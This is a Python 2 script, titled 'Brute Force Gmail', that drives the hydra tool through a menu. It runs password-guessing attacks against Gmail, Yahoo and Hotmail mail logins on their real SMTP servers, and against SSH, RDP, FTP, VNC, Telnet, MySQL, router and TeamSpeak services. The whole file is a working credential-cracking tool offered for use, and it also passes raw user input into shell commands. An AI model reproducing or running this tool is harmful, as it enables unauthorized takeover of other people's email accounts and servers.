#!/usr/bin/python
"""
Brute Force Gmail.  
"""
import sys, os, time

# Restart ####################
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################

os.system("clear")
print
print "              ===|[ Brute Force by Deiri]|==="
print
print "                     [01] Gmail Brute Force         "
print         
print         
print "  [00] Exit"
print
bhydra = raw_input("[*] B-Force > ")

if bhydra == '0r1' or bhydra == '1r':
  print
  print "          +---------------------------+"
  print "          |     Cisco Brute Force     |"
  print "          +---------------------------+"
  print
  print
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -P %s %s cisco" % (word, iphost))
  sys.exit()
  
elif bhydra == '02r' or bhydra == '2r':
  print
  print "          +---------------------------+"
  print "          |      VNC Brute Force      |"
  print "          +---------------------------+"
  print
  print
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  iphost = raw_input("[*] IP/Hostname : ")
  
elif bhydra == '0r3' or bhydra == 'r3':
  print
  print "          +------------------------------+"
  print "          |        FTP Brute Force       |"
  print "          +------------------------------+"
  print
  print
  user = raw_input("[*] User : ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()
  
elif bhydra == '01' or bhydra == '1':
  print
  print "          +------------------------------+"
  print "          |       Gmail Brute Force      |"
  print "          +------------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '054' or bhydra == '54':
   print
   print "         +--------------------------------+"
   print "         |        SSH Brute Force         |"
   print "         +--------------------------------+"
   print
   print
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()
   
elif bhydra == '046' or bhydra == '64':
	print
	print "        +-------------------------+"
	print "        |  TeamSpeak Brute Force  |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
	sys.exit()

elif bhydra == '037' or bhydra == '73':
	print
	print "        +-------------------------+"
	print "        |   Telnet Brute Force    |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
	sys.exit()
	
elif bhydra == '083' or bhydra == '38':
  print
  print "          +---------------------------+"
  print "          |     Yahoo Brute Force     |"
  print "          +---------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '039' or bhydra == '93':
  print
  print "          +----------------------------+"
  print "          |    Hotmail Brute Force     |"
  print "          +----------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '103':
	print
	print "        +-----------------------------+"
	print "        |  Router Speedy Brute Force  |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
	sys.exit()
	
elif bhydra == '113':
	print
	print "        +----------------------------+"
	print "        |      RDP Brute Force       |"
	print "        +----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
	sys.exit()
	
elif bhydra == '123':
	print
	print "        +-----------------------------+"
	print "        |       MySQL Brute Force     |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
	
elif bhydra == '00' or bhydra == '0':
	print "\n[!] Exit the Program..."
	sys.exit()
	
else:
	print "\n[!] ERROR : Wrong Input"
	time.sleep(1)
	restart_program()